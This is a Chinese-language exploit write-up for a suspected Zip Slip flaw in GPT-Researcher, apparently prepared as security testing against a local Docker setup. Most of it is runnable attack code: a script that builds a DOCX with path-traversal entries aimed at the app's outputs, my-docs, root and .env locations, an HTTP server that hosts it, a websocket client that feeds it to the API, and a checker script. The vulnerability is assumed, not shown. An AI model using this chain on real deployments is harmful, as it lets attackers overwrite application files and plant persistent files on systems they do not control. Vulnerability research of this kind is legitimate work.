# GPT-Researcher 真实攻击场景验证

## 攻击向量分析

### Docker环境配置
```yaml
# docker-compose.yml
services:
  gpt-researcher:
    volumes:
      - ${PWD}/my-docs:/usr/src/app/my-docs:rw
      - ${PWD}/outputs:/usr/src/app/outputs:rw
    user: gpt-researcher  # 非root用户
    ports:
      - 127.0.0.1:8002:8000
```

### 关键发现

1. **DOC_PATH**: `/usr/src/app/my-docs` (容器内路径)
2. **运行用户**: `gpt-researcher` (非root，限制了攻击面)
3. **可写目录**: `/usr/src/app/outputs`, `/usr/src/app/my-docs`
4. **暴露端口**: 8002 (本地) -> 8000 (容器)

## 真实攻击场景：通过document_urls的Zip Slip攻击

### 攻击链

```
用户/攻击者
    ↓
提供恶意document_url (正常API调用)
    ↓
OnlineDocumentLoader.load()
    ↓
_download_and_process(url) - 下载文件
    ↓
UnstructuredWordDocumentLoader(file_path) - 解压DOCX
    ↓
恶意文件被提取到容器中的任意位置！
```

### 漏洞位置

**文件**: `gpt_researcher/document/online_document.py:36-87`

```python
async def _download_and_process(self, url: str) -> list:
    # 从URL下载文件（可能是恶意的）
    content = await response.read()

    # 写入临时文件
    with tempfile.NamedTemporaryFile(delete=False, suffix=self._get_extension(url)) as tmp_file:
        tmp_file.write(content)  # ← 写入未验证的内容
        tmp_file_path = tmp_file.name

    # 使用UnstructuredWordDocumentLoader处理
    return await self._load_document(tmp_file_path, self._get_extension(url).strip('.'))
```

**问题**：
- `UnstructuredWordDocumentLoader`在解压DOCX时可能不验证路径
- DOCX是ZIP文件，可以包含`../../../path/to/file`
- 如果解压器不sanitize路径，文件会被写入到任意位置

### 攻击目标

在Docker容器中，攻击者可以：

1. **覆盖应用文件**：
   - `/usr/src/app/backend/server/server.py` - 修改服务器代码
   - `/usr/src/app/main.py` - 修改入口点
   - `/usr/src/app/.env` - 窃取API密钥

2. **创建恶意文件**：
   - `/usr/src/app/outputs/malicious.py` - 后续执行
   - `/usr/src/app/my-docs/backdoor.py` - 持久化

3. **信息泄露**：
   - 读取`.env`文件（包含API密钥）
   - 访问`outputs`目录中的其他研究结果

## 验证步骤

### 步骤1: 创建恶意DOCX文件

创建一个包含Zip Slip的DOCX：

```python
# create_malicious_docx.py
import zipfile
import time

def create_zip_slip_docx():
    """创建包含路径遍历的恶意DOCX"""
    filename = "malicious_document.docx"

    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) as zf:
        # 正常的DOCX结构（让它看起来合法）
        zf.writestr('word/document.xml',
                    '<?xml version="1.0"?>'
                    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
                    '<w:body><w:p><w:r><w:t>This is a test document for security research.</w:t></w:r></w:p></w:body>'
                    '</w:document>')

        zf.writestr('[Content_Types].xml',
                    '<?xml version="1.0"?>'
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                    '<Default Extension="xml" ContentType="application/xml"/>'
                    '</Types>')

        # 恶意载荷：路径遍历
        pwned_content = f"""
# SECURITY TEST - DO NOT PANIC
# This file was created by a security researcher to demonstrate Zip Slip vulnerability
# Created at: {time.time()}
# If you see this file, the vulnerability exists!

print("ZIP SLIP VULNERABILITY CONFIRMED!")
"""

        # 尝试多种路径遍历模式
        traversal_paths = [
            # 尝试写入到outputs目录（应该成功）
            '../outputs/PWNED_outputs.py',

            # 尝试写入到应用根目录（测试边界）
            '../PWNED_root.py',

            # 尝试写入到my-docs（应该成功）
            '../../my-docs/PWNED_mydocs.py',

            # 尝试覆盖.env（危险！）
            '../.env.PWNED',
        ]

        for path in traversal_paths:
            try:
                zf.writestr(path, pwned_content)
                print(f"[+] Added malicious path: {path}")
            except Exception as e:
                print(f"[-] Failed to add {path}: {e}")

    print(f"\n[✓] Created malicious DOCX: {filename}")
    return filename

if __name__ == "__main__":
    create_zip_slip_docx()
```

### 步骤2: 设置HTTP服务器提供恶意文件

```python
# serve_malicious_file.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

class CORSHTTPRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    server = HTTPServer(('0.0.0.0', 8888), CORSHTTPRequestHandler)
    print("[*] Serving malicious DOCX at http://localhost:8888/malicious_document.docx")
    print("[*] Press Ctrl+C to stop")
    server.serve_forever()
```

### 步骤3: 通过gpt-researcher API触发攻击

```python
# exploit_via_api.py
import requests
import json
import time

def exploit_via_document_urls():
    """通过document_urls参数触发Zip Slip"""

    # gpt-researcher API endpoint
    API_URL = "http://localhost:8002"

    # 恶意文档URL（由我们的服务器提供）
    MALICIOUS_URL = "http://host.docker.internal:8888/malicious_document.docx"

    # 构造研究请求
    research_payload = {
        "task": "Analyze this document for me",
        "report_type": "research_report",
        "report_source": "hybrid",  # 使用hybrid模式
        "source_urls": [],
        "document_urls": [MALICIOUS_URL],  # ← 恶意URL
        "tone": "Objective",
        "headers": {}
    }

    print("[*] Sending exploit request to gpt-researcher...")
    print(f"[*] Malicious document URL: {MALICIOUS_URL}")

    try:
        # 通过WebSocket或HTTP API发送请求
        # 方法1: 使用WebSocket (更真实)
        import websockets
        import asyncio

        async def send_via_websocket():
            uri = "ws://localhost:8002/ws"
            async with websockets.connect(uri) as websocket:
                # 发送start命令
                start_command = "start" + json.dumps(research_payload)
                await websocket.send(start_command)

                print("[*] Exploit sent! Waiting for processing...")

                # 接收响应
                while True:
                    try:
                        response = await websocket.recv()
                        data = json.loads(response)
                        print(f"[*] Response: {data.get('type', 'unknown')}")

                        if data.get('type') == 'path':
                            print("[✓] Processing complete!")
                            break
                    except Exception as e:
                        print(f"[!] Error: {e}")
                        break

        asyncio.run(send_via_websocket())

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return False

    print("\n[*] Checking for Zip Slip artifacts...")
    return True

if __name__ == "__main__":
    exploit_via_document_urls()
```

### 步骤4: 验证漏洞

```bash
#!/bin/bash
# verify_vulnerability.sh

echo "==================================================================="
echo "GPT-Researcher Zip Slip Vulnerability Verification"
echo "==================================================================="

# 检查Docker容器中的文件
echo -e "\n[*] Checking for PWNED files in container..."

CONTAINER_ID=$(docker ps | grep gpt-researcher | awk '{print $1}')

if [ -z "$CONTAINER_ID" ]; then
    echo "[!] gpt-researcher container not running!"
    exit 1
fi

echo "[*] Container ID: $CONTAINER_ID"

# 检查outputs目录
echo -e "\n[1] Checking /usr/src/app/outputs for PWNED_outputs.py..."
docker exec $CONTAINER_ID ls -la /usr/src/app/outputs/ | grep PWNED || echo "    Not found (expected if mitigated)"

# 检查应用根目录
echo -e "\n[2] Checking /usr/src/app for PWNED_root.py..."
docker exec $CONTAINER_ID ls -la /usr/src/app/ | grep PWNED || echo "    Not found (expected if mitigated)"

# 检查my-docs目录
echo -e "\n[3] Checking /usr/src/app/my-docs for PWNED_mydocs.py..."
docker exec $CONTAINER_ID ls -la /usr/src/app/my-docs/ | grep PWNED || echo "    Not found (expected if mitigated)"

# 检查.env文件
echo -e "\n[4] Checking for .env.PWNED..."
docker exec $CONTAINER_ID ls -la /usr/src/app/ | grep ".env.PWNED" || echo "    Not found (expected if mitigated)"

echo -e "\n[*] If any PWNED files exist, VULNERABILITY IS CONFIRMED!"
echo "[*] If no PWNED files exist, the vulnerability is mitigated."

# 检查本地挂载的目录（主机侧）
echo -e "\n[*] Checking host-side mounted directories..."
ls -la ./outputs/ | grep PWNED || echo "    outputs: No PWNED files"
ls -la ./my-docs/ | grep PWNED || echo "    my-docs: No PWNED files"

echo -e "\n==================================================================="
```

## 完整验证流程

### 环境准备

```bash
# 1. 进入gpt-researcher目录
cd /srv/home/shiqiu/Anewbenchmark/gpt-researcher

# 2. 确保Docker环境配置
cat .env.example > .env
# 编辑.env添加API密钥

# 3. 启动Docker容器
docker-compose up -d gpt-researcher

# 4. 验证容器运行
docker ps | grep gpt-researcher
```

### 执行攻击

```bash
# 终端1: 创建恶意文档
python create_malicious_docx.py

# 终端2: 启动HTTP服务器
python serve_malicious_file.py

# 终端3: 发送exploit请求
python exploit_via_api.py

# 终端4: 验证结果
bash verify_vulnerability.sh
```

## 预期结果

### 如果漏洞存在

```
[✓] PWNED_outputs.py found in /usr/src/app/outputs/
[✓] PWNED_root.py found in /usr/src/app/
[✓] PWNED_mydocs.py found in /usr/src/app/my-docs/
[!] CRITICAL: .env.PWNED found - API keys exposed!
```

### 如果漏洞已修复

```
[✓] No PWNED files found
[✓] All paths confined to intended directories
[✓] Extraction properly sanitized
```

## 影响评估

### 容器内影响（高）
- ✅ 可以覆盖应用代码
- ✅ 可以读取`.env`文件（API密钥泄露）
- ✅ 可以在`outputs`目录创建恶意文件
- ⚠️ 受限于容器文件系统（无法逃逸到主机）

### 持久化（中）
- 如果恶意文件写入挂载的卷（`my-docs`, `outputs`）
- 文件会保存在主机上
- 容器重启后仍然存在

### 权限提升（低）
- 容器以非root用户运行
- 无法修改系统文件
- 但可以修改应用文件（因为所有权是gpt-researcher用户）

## 缓解措施验证

修复后应该：

1. ✅ `UnstructuredWordDocumentLoader`正确sanitize路径
2. ✅ 所有提取的文件confined到临时目录
3. ✅ 临时文件在处理后被删除
4. ✅ 无法通过ZIP路径遍历写入任意位置

## 备注

这个验证方案：
- ✅ 使用gpt-researcher的正常API
- ✅ 在Docker环境中测试
- ✅ 模拟真实攻击场景（用户提供恶意URL）
- ✅ 不需要直接访问文件系统
- ✅ 可以自动化验证
